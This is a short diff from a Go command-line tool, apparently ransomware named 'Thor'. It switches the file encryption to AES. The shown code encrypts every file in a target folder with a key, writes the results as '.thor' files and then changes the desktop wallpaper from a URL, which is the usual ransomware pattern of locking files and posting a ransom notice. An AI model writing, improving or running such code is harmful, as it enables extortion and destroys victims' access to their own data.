@@ -40,7 +40,7 @@ var ThorCmd = &cobra.Command{
 			file_path := fmt.Sprintf(pwd+"/%s/%s", thor_folder, file.Name())
 			text, err := read_from_file(file_path)
 			check(err)
-			ciphertext := encrypt(string(text), thor_key)
+			ciphertext := encrypt_aes(string(text), thor_key)
 			write_to_file(ciphertext, fmt.Sprintf(pwd+"/%s/%s.thor", thor_folder, file.Name()))
 		}
 		change_wallpaper(url_wallpaper)
